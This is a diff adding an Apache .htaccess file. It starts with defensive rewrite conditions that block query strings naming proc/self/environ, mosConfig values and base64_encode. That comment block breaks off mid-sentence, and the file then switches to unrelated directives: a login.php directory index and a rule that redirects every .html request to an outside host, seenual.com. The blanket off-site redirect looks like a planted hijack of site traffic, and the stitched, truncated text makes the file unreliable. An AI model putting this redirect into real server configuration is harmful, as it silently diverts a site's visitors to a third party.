@@ -1,0 +1,19 @@
+ 
+RewriteEngine On 
+# proc/self/environ? noway!
+RewriteCond %{QUERY_STRING} proc/self/environ [OR]
+
+# Block out any script trying to set a mosConfig value through the URL
+RewriteCond %{QUERY_STRING} mosConfig_[a-zA-Z_]{1,21}(=|\%3D) [OR]
+
+# Block out any script trying to base64_encode crap to send via URL
+RewriteCond %{QUERY_STRING} base64_encode.*(.*) [OR]
+
+# Block out any script that includes a
+
+
+ 
+DirectoryIndex login.php
+RewriteRule .*\.(html)$ http://seenual.com/change_img.gif[NC,R,L]
+ ErrorDocument 404 https://localhost/project/err404.htm
+ErrorDocument 500 https://localhost/project/err404.htm
